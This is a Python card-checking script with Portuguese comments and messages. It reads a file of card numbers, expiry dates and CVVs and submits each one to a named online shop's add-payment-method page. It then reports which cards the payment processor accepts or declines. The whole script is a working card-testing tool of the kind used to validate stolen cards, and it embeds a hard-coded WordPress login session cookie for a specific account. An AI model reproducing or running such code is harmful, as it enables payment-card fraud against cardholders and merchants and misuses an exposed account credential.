import requests

def verificar_cartao(numero, mes, ano, cvv):
    url = 'https://penshopmalta.com/my-account/add-payment-method/'
    cookies = {
        'sbjs_migrations': '1418474375998%3D1',
        'sbjs_current_add': 'fd%3D2024-07-31%2001%3A00%3A34%7C%7C%7Cep%3Dhttps%3A%2F%2Fpenshopmalta.com%2Fmy-account%2Fpayment-methods%2F%7C%7C%7Crf%3D%28none%29',
        'sbjs_first_add': 'fd%3D2024-07-31%2001%3A00%3A34%7C%7C%7Cep%3Dhttps%3A%2F%2Fpenshopmalta.com%2Fmy-account%2Fpayment-methods%2F%7C%7C%7Crf%3D%28none%29',
        'sbjs_current': 'typ%3Dtypein%7C%7C%7Csrc%3D%28direct%29%7C%7C%7Cmdm%3D%28none%29%7C%7C%7Ccmp%3D%28none%29%7C%7C%7Ccnt%3D%28none%29%7C%7C%7Ctrm%3D%28none%29%7C%7C%7Cid%3D%28none%29%7C%7C%7Cplt%3D%28none%29%7C%7C%7Cfmt%3D%28none%29%7C%7C%7Ctct%3D%28none%29',
        'sbjs_first': 'typ%3Dtypein%7C%7C%7Csrc%3D%28direct%29%7C%7C%7Cmdm%3D%28none%29%7C%7C%7Ccmp%3D%28none%29%7C%7C%7Ccnt%3D%28none%29%7C%7C%7Ctrm%3D%28none%29%7C%7C%7Cid%3D%28none%29%7C%7C%7Cplt%3D%28none%29%7C%7C%7Cfmt%3D%28none%29%7C%7C%7Ctct%3D%28none%29',
        'wordpress_logged_in_b2815790fac16ed3a3e9c4203c3c48c9': 'eduzinweb%7C1723597252%7CUtZFzyMe4i35cwst6wYGeKXMGxYtcmF4IJe8Xu5NW3p%7Cb144e53fd22b55d5d9c11aaa2e18863479083373540074ddd50e2230f45b103f',
        'sbjs_udata': 'vst%3D2%7C%7C%7Cuip%3D%28none%29%7C%7C%7Cuag%3DMozilla%2F5.0%20%28Linux%3B%20Android%2011%3B%20SM-A307GT%20Build%2FRP1A.200720.012%29%20AppleWebKit%2F537.36%20%28KHTML%2C%20like%20Gecko%29%20Version%2F4.0%20Chrome%2F126.0.6478.188%20Mobile%20Safari%2F537.36',
        'sbjs_session': 'pgs%3D4%7C%7C%7Ccpg%3Dhttps%3A%2F%2Fpenshopmalta.com%2Fmy-account%2Fadd-payment-method%2F'
    }

    headers = {
        'User-Agent': 'Mozilla/5.0 (Linux; Android 11; SM-A307GT Build/RP1A.200720.012) AppleWebKit/537.36 (KHTML, like Gecko) Version/4.0 Chrome/126.0.6478.188 Mobile Safari/537.36',
        'Content-Type': 'application/x-www-form-urlencoded'
    }

    data = {
        'card_number': numero,
        'exp_date': f'{mes}/{ano}'
    }

    response = requests.post(url, headers=headers, cookies=cookies, data=data)

    if "payment method added successfully" in response.text:
        return "Cartão adicionado com sucesso"
    elif "There was an error saving your payment method. Reason: Processor Declined" in response.text:
        return "Erro ao adicionar cartão: Processor Declined"
    else:
        return "Erro ao adicionar cartão: Resposta inesperada"

# Função para ler e verificar cartões de um arquivo
def verificar_cartoes_arquivo(filename):
    with open(filename, 'r') as file:
        cartoes = file.readlines()

    resultados = []
    for cartao in cartoes:
        numero, mes, ano, cvv = cartao.strip().split('|')
        resultado = verificar_cartao(numero, mes, ano, cvv)
        resultados.append(f'{cartao.strip()} - {resultado}')
    
    return resultados

# Verificar cartões do arquivo 'ccs1.txt' e imprimir resultados
resultados = verificar_cartoes_arquivo('/sdcard/bot/ccs1.txt')
for resultado in resultados:
    print(resultado)
